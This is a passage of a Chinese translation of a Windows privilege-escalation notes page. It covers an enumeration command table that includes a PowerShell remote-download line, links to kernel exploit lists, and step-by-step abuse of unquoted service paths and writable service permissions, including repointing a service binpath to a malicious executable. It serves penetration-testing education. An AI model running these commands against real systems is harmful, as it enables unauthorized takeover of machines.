# Windows提权笔记
>  ps：文章本人根据情景翻译，不对之处请GG指出。-。-
[原文地址](http://memorycorruption.org/windows/2018/07/29/Notes-On-Windows-Privilege-Escalation.html):  
你好基友们！  
以下是我对`Windows`提权研究的看法。  
Windows权限的涉及的领域范围很广，简单的一篇文章只能说包含常见的手法，本文算是一个小小的WIKI，我写这篇文章的目的只是给自己做一个笔记，与此同时给别人一个参考，共同分享`our
thinking！`
我的WIKI设计以下主题：
  * Windows提权命令参考
  * 本地权限提升
  * 服务漏洞
  * Windows注册表
  * 不安全的文件系统权限
  * AlwaysInstallElevated
  * 获得凭证
  * 利用令牌权限
  * DLL 劫持
  * 自动化的工具和框架
## Windows提权命令参考
以下是一些必要的Windows命令：
命令 | 描述  
---|---  
systeminfo | 打印系统信息  
whoami | 获得当前用户名  
whoami /priv | 当前帐户权限  
ipconfig | 网络配置信息  
ipconfig /displaydns | 显示DNS缓存  
route print | 打印出路由表  
arp -a | 打印arp表  
hostname | 主机名  
net user | 列出用户  
net user UserName | 关于用户的信息  
net use \SMBPATH Pa$$w0rd /u:UserName | 连接SMB  
net localgroup | 列出所有组  
net localgroup GROUP | 关于指定组的信息  
net view \127.0.0.1 | 会话打开到当前计算机  
net session | 开放给其他机器  
netsh firewall show config | 显示防火墙配置  
DRIVERQUERY | 列出安装的驱动  
tasklist /svc | 列出服务任务  
net start | 列出启动的服务  
dir /s _foo_ | 在目录中搜索包含指定字符的项目  
dir /s _foo_ == _bar_ | 同上  
sc query | 列出所有服务  
sc qc ServiceName | 找到指定服务的路径  
shutdown /r /t 0 | 立即重启  
type file.txt | 打印出内容  
icacls “C:\Example” | 列出权限  
wmic qfe get Caption,Description,HotFixID,InstalledOn | 列出已安装的布丁  
(New-Object
System.Net.WebClient).DownloadFile(“) |
利用ps远程下载文件到本地  
accesschk.exe -qwsu “Group” | 修改对象（尝试Everyone，Authenticated Users和/或Users）  
这个起点比较友好，下面还有一些可以参考的：
    https://www.microsoft.com/en-us/download/details.aspx?id=2632
    https://ss64.com/nt/
    https://www.sans.org/security-resources/sec560/windows_command_line_sheet_v1.pdf
另外还有两个语言供参考：
  * [WMIC](https://www.computerhope.com/wmic.htm)
  * [PowerShell](https://ss64.com/ps/)
## Exploits
多年来，Windows肯定有很多内核攻击的案例分享，并且不乏各种版本的本地提权exp。事实上，本指南列出的内容很多。  
有关Windows漏洞的一些相关列表，请参阅以下资源：
    https://github.com/SecWiki/windows-kernel-exploits
    https://www.exploit-db.com/local/
    https://pentestlab.blog/2017/04/24/windows-kernel-exploits/
务必检查系统的补丁级别，以确定它是否可利用。正常的测试是检查系统上最新补丁的日期。如果它比漏洞利用程序更旧，则系统可能容易受到攻击。请务必查找该漏洞利用程序的相关修补程序，并查看它是否已安装。还要记住，利用内核漏洞可能会影响系统的稳定性(会把系统打崩)！在测试产品之前要小心。首先探索其他潜在的载体总是好的。
## 服务配置错误
利用配置错误的服务进行提升权限是常用方法。本节将介绍可以利用的Windows服务的几种方法。
### 不带引号的服务路径
当系统管理员配置Windows服务时，他们必须指定要执行的命令，或者运行可执行文件的路径。
当Windows服务运行时，会发生以下两种情况之一。如果给出了可执行文件，并且引用了完整路径，则系统会按字面解释它并执行。但是，如果服务的二进制路径未包含在引号中，则操作系统将会执行找到的空格分隔的服务路径的第一个实例。
这可能有点不直观，所以让我们来看一个实际的例子。假设服务配置类似于以下存在bug的示例服务：
    C:\Program Files\Vulnerable Service\Sub Directory\service.exe
Windows命令解释程序可能会遇到名称中的空格，并且希望通过将字符串包装在引号中来对它们进行转义。在上面的示例中，如果系统运行该服务，它将尝试运行以下可执行文件：
    C:\Program.exe
    C:\Program Files\Vulnerable.exe
    C:\Program Files\Vulnerable Service\Sub.exe
    C:\Program Files\Vulnerable Service\Sub Directory\service.exe
为了讲清楚这个漏洞，定义一个名为`example.exe`的程序，这是一个简单打印出自己名称的正常二进制文件：
    #include 
    void main(int argc, char *argv[])
    {
        printf("[*] Executed %s\n", argv[0]);
    }
考虑当从命令行通过其绝对路径执行此程序时会发生什么，在引号内：
    C:\>"C:\Example\Sub Directory\example.exe"
    [*] Executed C:\Example\Sub Directory\example.exe
    C:\>
or：  
    C:\>C:\Example\Sub Directory\example.exe
    'C:\Example\Sub' is not recognized as an internal or external command, operable program or batch file.
    C:\>
这意味着如果服务路径不加引号，我们可以放置一个与第一个名称相同的恶意二进制文件作为文件系统对象，并在其名称中包含空格，并且当服务尝试执行其二进制文件时会将它运行。我们所需要的只是对路径中目录的写权限。  
Cosider通过隐藏example.exe来利用上述示例，`C:\Example\Sub.exe`在没有空格的情况下调用上面的示例，如易受攻击的服务：
    C:\>C:\Example\Sub Directory\example.exe
    [*] Executed C:\Example\Sub
    C:\>
一条命令找到这些错误配置：
    wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
### 不安全的服务权限
即使正确引用了服务路径，也可能存在其他漏洞。由于管理配置错误，用户可能对服务拥有过多的权限，例如，可以直接修改它。  
AccessChk工具可以用来查找用户可以修改的服务：
    C:\Users\user\Desktop>accesschk.exe -uwcqv "user" * 
    accesschk.exe -uwcqv "user" *
    Accesschk v6.02 - Reports effective permissions for securable objects
    Copyright (C) 2006-2016 Mark Russinovich
    Sysinternals - www.sysinternals.com
    RW Vulnerable Service
     SERVICE_ALL_ACCESS
    C:\Users\user\Desktop>
也可以使用以下`sc qc`命令查询服务：
    C:\Users\user\Desktop>sc qc "Service"
    sc qc "Service"
    [SC] QueryServiceConfig SUCCESS
    SERVICE_NAME: Service
            TYPE               : 10  WIN32_OWN_PROCESS 
            START_TYPE         : 2   AUTO_START
            ERROR_CONTROL      : 1   NORMAL
            BINARY_PATH_NAME   : C:\Program Files (x86)\Program Folder\Subfolder\Service.exe
            LOAD_ORDER_GROUP   : UIGroup
            TAG                : 0
            DISPLAY_NAME       : Service
            DEPENDENCIES       : 
            SERVICE_START_NAME : LocalSystem
    C:\Users\user\Desktop>
最后，可以在HKLM\SYSTEM\CurrentControlSet\Services注册表项中找到有关服务的信息。另请参阅本指南Windows注册表的部分。
如果可以修改服务的BINPATH，则可以利用它：
    C:\Users\user\Desktop>sc config "Vulnerable" binpath="C:\malicious.exe"
    sc config "Vulnerable" binpath="C:\malicious.exe"
    [SC] ChangeServiceConfig SUCCESS
    C:\Users\user\Desktop>
修改后，必须重新启动服务才能执行二进制文件。可以手动重启服务。先停止它：
    C:\Users\user\Desktop>sc stop "Vulnerable"
    sc stop "Vulnerable"
    SERVICE_NAME: Vulnerable 
            TYPE               : 10  WIN32_OWN_PROCESS  
            STATE              : 3  STOP_PENDING 
                                    (STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
            WIN32_EXIT_CODE    : 0  (0x0)
            SERVICE_EXIT_CODE  : 0  (0x0)
            CHECKPOINT         : 0x0
            WAIT_HINT          : 0x0
然后启动！
    C:\Users\user\Desktop>sc start "Vulnerable"
作为低权限用户，这可能会失败：
    C:\Users\user\Desktop>sc stop "ServiceName"
    sc stop "ServiceName"
    [SC] OpenService FAILED 5:
    Access is denied.